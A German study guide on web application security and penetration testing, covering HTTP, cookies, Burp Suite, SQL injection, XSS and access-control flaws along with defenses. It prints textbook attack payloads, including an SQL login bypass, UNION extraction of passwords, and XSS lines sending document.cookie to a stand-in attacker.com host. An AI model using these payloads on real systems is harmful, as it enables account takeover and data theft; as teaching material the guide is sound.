## 1. Grundlagen: Web-Technologien verstehen

### Die HTTP-Kommunikation

**HTTP Request (Anfrage)**

1. **Methode:** Die Aktion (GET = Daten abrufen, POST = Daten senden)
2. **Pfad:** Die gewünschte Ressource (z.B. `/users/login`)
3. **Header:** Zusatzinfos (Host, User-Agent, Cookie)
4. **Body:** Optional bei POST (z.B. Username, Passwort)

**HTTP Response (Antwort)**

1. **Status Code:** Ergebnis (200 = OK, 404 = Nicht gefunden)
2. **Header:** Metadaten (Content-Type, Set-Cookie)
3. **Body:** Der eigentliche Inhalt (HTML, CSS, JavaScript)

### Die Bausteine einer Webseite

- **HTML:** Das Gerüst (Struktur und Inhalt)
- **CSS:** Das Design (Farben, Schriftarten, Layout)
- **JavaScript:** Das Verhalten (Interaktivität, Validierung)

### Cookies - Zustand merken

HTTP ist "zustandslos" - jede Anfrage ist unabhängig. Cookies lösen das Problem:

- Server sendet `Set-Cookie` im Header
- Browser speichert den Cookie
- Browser sendet Cookie bei jeder Anfrage zurück
- So bleibst du eingeloggt

**Wichtige Cookie-Attribute:**

- `HttpOnly`: Schutz vor JavaScript-Zugriff (XSS-Schutz)
- `Secure`: Nur über HTTPS senden
- `SameSite`: CSRF-Schutz

---

## 2. Der Penetration-Test-Workflow

### Phase 1: Reconnaissance & Mapping

**Ziel:** Vollständige Karte der Anwendung erstellen

**Automatische Entdeckung:**

- Versteckte Verzeichnisse finden (`/admin`, `/backups`, `/dev`)
- Tools nutzen für systematische Suche

**Manuelle Erkundung mit Proxy:**

- Gesamte Anwendung durchklicken
- Jeden Request loggen für spätere Analyse
- Fokus auf: Login, Registrierung, File-Uploads, Suchfelder

**Technologie-Identifikation:**

- HTTP-Header analysieren
- Verwendete Frameworks erkennen
- Hilft bei gezielter Schwachstellensuche

### Phase 2: Schwachstellen-Analyse

**Hypothese bilden:**

- "Diese Suchleiste könnte XSS-anfällig sein"
- "Dieser `?id=123` Parameter könnte SQL-Injection ermöglichen"

**Hypothese testen:**

- Request abfangen und modifizieren
- Verschiedene Payloads ausprobieren
- Response analysieren auf unerwartetes Verhalten

**Exploitation:**

- Schwachstelle bestätigen
- Impact demonstrieren

### Phase 3: Reporting

- Klare Dokumentation aller Findings
- Business-Impact erklären
- Schritt-für-Schritt Reproduktion
- Lösungsvorschläge

---

## 3. Burp Suite - Das Hauptwerkzeug

**Was ist Burp Suite?** Ein "Person-in-the-Middle" für Web-Traffic:

- Browser → Burp Suite → Server
- Server → Burp Suite → Browser
- Ermöglicht: Abfangen, Ansehen, Modifizieren

### Die wichtigsten Tools

**Proxy Tab**

- **Intercept:** Requests/Responses in Echtzeit pausieren und ändern
- **HTTP History:** Alle Requests loggen

**Target Tab**

- Automatische Site Map
- Zeigt alle entdeckten Seiten und Endpoints

**Repeater Tab**

- Manuelles, iteratives Testen
- Request ändern und neu senden
- Perfekt für gezielte Schwachstellensuche

**Intruder Tab**

- Automatisierte Angriffe
- Tausende Payloads testen
- Nützlich für: Fuzzing, Brute-Force, Enumeration

### HTTPS und Burp Suite

Burp erstellt zwei separate Verbindungen:

1. Browser ↔ Burp (verschlüsselt)
2. Burp ↔ Server (verschlüsselt)

**Wichtig:** CA-Zertifikat im Browser installieren, damit er Burp vertraut!

---

## 4. SQL-Injection (SQLi)

### Was ist SQL?

**SELECT-Befehl** (Daten abrufen):

```sql
SELECT user_id, username, password_hash 
FROM users 
WHERE username = 'alice';
```

**Weitere Befehle:**

- `INSERT INTO`: Neue Daten einfügen
- `UPDATE`: Daten ändern
- `DELETE FROM`: Daten löschen

### Wie Web-Apps Datenbanken nutzen

**Der gefährliche Prozess:**

1. User gibt Login-Daten ein
2. App erstellt SQL-Query mit diesen Daten
3. **Kritisch:** Query wird durch String-Verkettung gebaut
4. Datenbank führt Query aus
5. App reagiert auf Ergebnis

**Unsicherer Code-Beispiel:**

```python
username = request.form.get('username')  # 'alice'
password = request.form.get('password')  # 'password123'

# GEFÄHRLICH: Einfache String-Verkettung!
query = "SELECT * FROM users WHERE username = '" + username + "' AND password = '" + password + "';"
```

### SQL-Injection erklärt

**Definition:** Angreifer fügt eigenen SQL-Code in User-Input ein und ändert die Query-Logik.

### Klassischer Authentication Bypass

**Original Query:**

```sql
SELECT * FROM users WHERE username = '[USERNAME]' AND password = '[PASSWORD]';
```

**Attacker-Input im Username-Feld:**

```
' OR '1'='1' --
```

**Resultierende Query:**

```sql
SELECT * FROM users WHERE username = '' OR '1'='1' --' AND password = '';
```

**Was passiert:**

1. `'` schließt den Username-String
2. `OR '1'='1'` ist immer WAHR
3. `--` kommentiert den Rest aus
4. Passwort-Check wird ignoriert
5. Query findet ALLE User
6. App loggt Angreifer als ersten User (oft Admin) ein

### Arten von SQL-Injection

**1. In-Band SQLi (Klassisch)**

**Error-Based:**

- Fehlerhafte Query absichtlich provozieren
- Fehlermeldung zeigt interne Details (Tabellen, Spalten)

**UNION-Based:**

- `UNION` kombiniert zwei SELECT-Statements
- Angreifer fügt eigene Query hinzu

**Beispiel:**

```sql
-- Original Query
SELECT name, price FROM products WHERE id='1'

-- Injection
' UNION SELECT username, password FROM users--

-- Resultierende Query
SELECT name, price FROM products WHERE id='' 
UNION SELECT username, password FROM users--
```

Seite zeigt jetzt Usernames und Passwörter statt Produkten!

**2. Blind SQLi (Inferential)**

Keine Daten werden direkt angezeigt - Angreifer muss raten.

**Boolean-Based:**

- Ja/Nein-Fragen stellen
- Unterschiedliche Seiten-Reaktion = True/False

**Beispiel:** Passwort Zeichen für Zeichen erraten

```sql
-- Ist das erste Zeichen 'p'?
... AND (SELECT SUBSTRING(password, 1, 1) FROM users WHERE username='admin') = 'p'
```

Wenn Seite anders reagiert → Treffer!

**Time-Based:**

- Datenbank pausieren lassen bei True
- 5 Sekunden Verzögerung = Antwort ist True

**3. Out-of-Band SQLi**

- Datenbank macht externe Verbindung
- Gestohlene Daten über anderen Kanal senden

### Impact von SQLi

**Vertraulichkeit:** Zugriff auf alle Daten (Passwords, Kreditkarten, Geheimnisse) **Integrität:** Daten ändern oder löschen **Verfügbarkeit:** Komplette Datenbank löschen **Authentication Bypass:** Jeder Account übernehmen **Complete Takeover:** Server-Befehle ausführen

**Reale Beispiele:**

- Heartland Payment Systems (2008): 130 Mio. Kreditkarten gestohlen
- TalkTalk (2015): Tausende Kundendaten exponiert

---

## 5. Cross-Site Scripting (XSS)

### Was ist XSS?

**Definition:** Angreifer fügt schädliche Skripte (meist JavaScript) in Webseiten ein, die dann von anderen Usern ausgeführt werden.

**Das Problem:** Browser vertraut allen Skripten von einer vertrauenswürdigen Domain. Er unterscheidet nicht zwischen legitimen und injizierten Skripten.

### Was kann ein Angreifer tun?

1. **Session Cookies stehlen**
    
    - `document.cookie` auslesen
    - An eigenen Server senden
    - User-Account übernehmen ohne Passwort
2. **Keylogging**
    
    - Jeden Tastendruck aufzeichnen
    - Passwörter beim Tippen abfangen
3. **Aktionen im Namen des Users**
    
    - Passwort ändern
    - Nachrichten senden
    - Geld überweisen
    - Daten löschen
4. **Weiterleitung zu Phishing-Seiten**
    
    - User auf gefälschte Login-Seite umleiten
5. **Website-Defacing**
    
    - Inhalt der Seite ändern
    - Fake Login-Form einfügen

### Die 3 Haupttypen von XSS

**1. Reflected XSS (Non-Persistent)**

**Ablauf:**

1. Payload ist Teil der URL
2. Server reflektiert Payload zurück in Response
3. Opfer muss auf Link klicken

**Beispiel - Verwundbare Suchfunktion:**

```
Normal: https://website.com/search?query=reports
Zeigt: "Ergebnisse für: reports"

Angriff: https://website.com/search?query=<script>alert('XSS')</script>
```

Server fügt Query direkt in HTML ein → Skript wird ausgeführt!

**Echter Angriff:**

```
https://website.com/search?query=<script src="https://attacker.com/stealer.js"></script>
```

**2. Stored XSS (Persistent)**

**Der gefährlichste Typ!** Payload wird permanent in Datenbank gespeichert.

**Ablauf:**

1. Angreifer postet Kommentar mit Skript
2. Skript wird in Datenbank gespeichert
3. Jeder Besucher lädt das Skript vom Server
4. Skript wird automatisch ausgeführt

**Beispiel - Blog-Kommentar:**

```html
Toller Artikel! 
<script>
// Code zum Stehlen von Session Cookies
fetch('https://attacker.com/steal?cookie=' + document.cookie);
</script>
```

Jeder der den Artikel liest, wird angegriffen! "One-to-Many" Attack.

**3. DOM-based XSS**

**Besonderheit:** Schwachstelle liegt im Client-Side JavaScript, nicht im Server-Code.

**Beispiel - Sprach-Auswahl:**

```javascript
// Verwundbarer Code
var lang = window.location.hash.substring(6); // Liest #lang=en
document.getElementById('selectedLang').innerHTML = "Deine Sprache: " + lang;
```

**Angriff-URL:**

```
http://example.com/settings#lang=<img src=x onerror=alert('DOM XSS')>
```

**Was passiert:**

1. JavaScript liest Fragment aus URL
2. Schreibt es direkt mit `.innerHTML` in Seite
3. Browser parst neues HTML
4. `onerror` Handler wird ausgeführt

**Kritisch:** Server sieht den Payload nie! Der ist nur im Fragment (`#...`).

### Schutzmaßnahmen

**1. Input Validation/Sanitization**

- Alle User-Eingaben als nicht vertrauenswürdig behandeln
- Strikte Regeln definieren (Alter = nur Zahlen)
- Ungültige Eingaben ablehnen
- Gefährliche Zeichen entfernen

**2. Output Encoding (Wichtigste Verteidigung!)**

- Vor dem Einfügen in HTML: Spezialzeichen kodieren
- `<` wird zu `&lt;`
- Browser zeigt `<` als Text, interpretiert es aber nicht als HTML-Tag
- Macht Skripte harmlos

---

## 6. Broken Authentication & Access Control

### Authentication vs. Authorization

**Authentication (Authentifizierung):** "Wer bist du?"

- Identität überprüfen
- Login mit Username/Passwort
- Faktoren:
    - **Wissen:** Passwort, PIN, Sicherheitsfrage
    - **Besitz:** Handy (für Code), Hardware-Token
    - **Sein:** Fingerabdruck, Gesichtserkennung

**Multi-Factor Authentication (MFA):** Kombination aus 2+ Faktoren = deutlich sicherer!

**Authorization (Autorisierung):** "Was darfst du tun?"

- Geschieht NACH erfolgreicher Authentication
- Bestimmt Berechtigungen und Zugriff

**Beispiel - Konzert:**

- Ticket = Authentication (du bist berechtigt reinzukommen)
- Ticket-Typ (VIP/Normal) = Authorization (wo du hingehen darfst)

### Session Management

**Das Problem:** HTTP ist zustandslos - Server vergisst dich sofort.

**Die Lösung:** Sessions mit Identifiern

**Cookies:**

```
Server setzt: Set-Cookie: sessionID=a1b2c3d4e5f67890...
Browser sendet: Cookie: sessionID=a1b2c3d4e5f67890...
```

**Session Tokens (z.B. JWT):**

```
Client sendet: Authorization: Bearer <token>
```

**JWT-Struktur:**

```
header.payload.signature
```

- Header & Payload: Base64 kodiert (lesbar)
- Signature: Kryptografischer Hash (Manipulationsschutz)

### Broken Authentication - Schwachstellen

**1. Credential Stuffing**

- Gestohlene Login-Daten von anderen Breaches nutzen
- Funktioniert weil viele Passwörter wiederverwenden

**2. Brute-Force-Angriffe**

- Alle möglichen Passwort-Kombinationen durchprobieren
- **Schutz:** Rate Limiting, Account Lockout

**3. Schwache Passwort-Richtlinien**

- User dürfen "123456" oder "password" setzen

**4. Unsichere Passwort-Speicherung**

- Passwörter im Klartext in DB
- **Richtig:** Starkes, gesalzenes Hashing

### Broken Access Control - Schwachstellen

**Zwei Haupttypen:**

**1. Horizontal Access Control Failure** User greift auf Ressourcen von anderen Usern (gleiche Ebene) zu

**Beispiel - IDOR (Insecure Direct Object Reference):**

```
Dein Account: https://example.com/account?id=456

Angriff: https://example.com/account?id=123
```

Kannst du Account 123 sehen? → Schwachstelle!

**Korrekt:** Server muss prüfen ob User 456 berechtigt ist Account 123 zu sehen.

**2. Vertical Access Control Failure** User greift auf Admin-Funktionen zu (höhere Ebene)

**Beispiel - Missing Function Level Access Control:**

```
Admin-Panel-Link ist versteckt für normale User

Aber: https://example.com/admin/deleteUser?id=5 funktioniert trotzdem!
```

**Korrekt:** Server muss bei JEDEM Request prüfen ob User Admin-Rechte hat.

**Privilege Escalation:**

- Ziel vieler Angriffe
- Von normalem User zu Admin-Rechten
- Durch Access-Control-Schwachstellen

### Real-World-Impact

**Horizontal:**

- Bankkonten anderer User einsehen
- Private Nachrichten lesen
- Fremde Bestellungen ändern

**Vertical:**

- User löschen
- System-Einstellungen ändern
- Komplette Kontrolle übernehmen

---

## 7. Praktische Tipps

### Sichere Entwicklung

**SQL-Injection verhindern:**

- **Prepared Statements** verwenden (nie String-Verkettung!)
- Input Validation
- Principle of Least Privilege für DB-User

**XSS verhindern:**

- Output Encoding für alle User-Daten
- Content Security Policy (CSP) Header
- HttpOnly & Secure Flags für Cookies

**Access Control richtig implementieren:**

- Serverseitige Checks IMMER durchführen
- Nie nur auf Client-Side verlassen
- "Default Deny" Prinzip
- Role-Based Access Control (RBAC)

### Testing-Mindset

1. **Niemals dem Frontend vertrauen**
    
    - Frontend ist nur ein Vorschlag
    - Backend ist die Wahrheit
    - Immer HTTP-Requests manipulieren
2. **Systematisch vorgehen**
    
    - Mapping → Hypothesen → Testen → Exploiten → Dokumentieren
3. **An den "Edges" testen**
    
    - Was passiert bei unerwarteten Inputs?
    - Negative Zahlen? Sehr lange Strings? SQL-Zeichen?
4. **Immer autorisiert testen**
    
    - Nur mit Erlaubnis
    - Legale Test-Umgebungen nutzen
    - Dokumentation aller Tests

---

## 8. Setup & Tools

### Burp Suite Installation

**1. Download & Installation**

- Von [portswigger.net](https://portswigger.net/burp/communitydownload)
- Community Edition ist kostenlos
- Für Mac: ARM-Version (Apple Silicon)
- Für Kali: Linux ARM-Version

**Kali Installation:**

```bash
# Ausführbar machen
chmod +x burpsuite_community_linux_arm64_v2025_8_4.sh

# Installieren
./burpsuite_community_linux_arm64_v2025_8_4.sh
```

**2. Browser konfigurieren**

**CA-Zertifikat installieren:**

1. Burp Suite starten
2. Browser zu `http://burpsuite` navigieren
3. CA Certificate downloaden
4. Im Browser importieren

**Proxy einstellen:**

- **Am besten:** FoxyProxy Extension installieren
    - Firefox: [FoxyProxy Standard](https://addons.mozilla.org/firefox/addon/foxyproxy-standard/)
    - Chrome: [FoxyProxy](https://chromewebstore.google.com/detail/foxyproxy/)
- Proxy auf `127.0.0.1:8080` setzen

### Wichtige Burp Suite Shortcuts

**Intercept:**

- `Intercept is on/off`: Traffic pausieren/weiterleiten
- `Forward`: Request durchlassen
- `Drop`: Request verwerfen

**Send to:**

- `Ctrl+R`: Send to Repeater
- `Ctrl+I`: Send to Intruder

---

## Zusammenfassung - Die wichtigsten Punkte

### Core Concepts

1. **HTTP-Kommunikation verstehen** - Request/Response, Header, Body
2. **Sessions & Cookies** - Wie Apps User identifizieren
3. **Penetration Test Workflow** - Mapping → Testing → Reporting

### Critical Vulnerabilities

4. **SQL-Injection** - Gefährlichste DB-Schwachstelle, Authentication Bypass
5. **XSS** - Skript-Injection, Session-Hijacking, alle 3 Typen kennen
6. **Access Control** - Horizontal & Vertical Failures, IDOR

### Tools & Techniques

7. **Burp Suite** - Intercepting Proxy ist essentiell
8. **Systematisches Testing** - Hypothesen bilden und gezielt testen

### Security Principles

9. **Defense in Depth** - Mehrere Schutzschichten
10. **Never Trust User Input** - Validieren & Enkodieren
11. **Server-Side Validation** - Niemals nur Client-Side
12. **Principle of Least Privilege** - Minimale Berechtigungen

---

## Nächste Schritte

### Zum Üben

1. **TryHackMe Rooms** zu SQLi, XSS, Authentication
2. **DVWA** (Damn Vulnerable Web Application)
3. **OWASP WebGoat**
4. **PortSwigger Web Security Academy**

### Zum Vertiefen

- OWASP Top 10 durcharbeiten
- Bug Bounty Programme erforschen
- Web Application Hacker's Handbook lesen
- CTF Challenges lösen

### Wichtig

- Nur in legalen Umgebungen testen
- Immer schriftliche Erlaubnis einholen
- Verantwortungsvoll mit Wissen umgehen
- Kontinuierlich lernen und üben

---

_Erstellt für mobile Wiederholung unterwegs_ _Fokus auf die 20% die 80% des Verständnisses bringen_